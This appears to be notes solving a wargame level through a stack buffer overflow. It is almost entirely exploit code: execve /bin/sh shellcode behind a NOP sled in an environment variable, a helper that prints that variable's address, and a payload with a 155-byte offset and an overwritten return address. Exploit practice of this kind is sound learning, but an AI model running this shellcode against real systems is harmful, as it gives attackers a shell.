EIP offset == 155


```sh
export SHELLCODE=`python -c "print('\x90' * 1024 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80')"`
```

```c
#include <stdio.h>
#include <stdlib.h>

int		main(int ac, char **av)
{
	(void)ac;
	printf("%s: %p\n", av[1], getenv(av[1]));
	return (0);
}
```

```sh
vim /var/crash/env.c
gcc /var/crash/env.c -o /var/crash/env
/var/crash/env SHELLCODE
SHELLCODE: 0x7fffffffe444
```

```sh
python -c "print('?' * 155 + '\x00\x00\x7f\xff\xff\xff\xe5\x44'[::-1])" > /var/crash/lvl4_r1
```
